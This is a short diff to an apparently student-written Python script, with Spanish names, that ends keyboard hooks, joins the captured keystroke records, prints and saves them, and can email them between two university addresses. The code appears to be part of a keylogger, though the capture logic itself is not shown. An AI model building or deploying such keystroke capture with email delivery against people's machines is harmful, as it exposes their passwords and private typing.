@@ -37,8 +37,11 @@ def main():
             
     keyboard.unhook_all()
     
-    registro = "\n".join(registros)
-      
+    registro = ",".join(registros)
+
+    print(registro)
+    output(registro)
+    
     if respuesta_email.lower() in ['yes', 'y']:
         sender_email = "janet1204@ciencias.unam.mx"
         receiver_email = "Paola_VB@ciencias.unam.mx"
@@ -50,7 +53,7 @@ def main():
         stop_postfix()
         
     if respuesta_guardar.lower() in ['yes', 'y']:
-        output(registro)
+        remove('output.txt')
 
 if __name__ == "__main__":
     main()
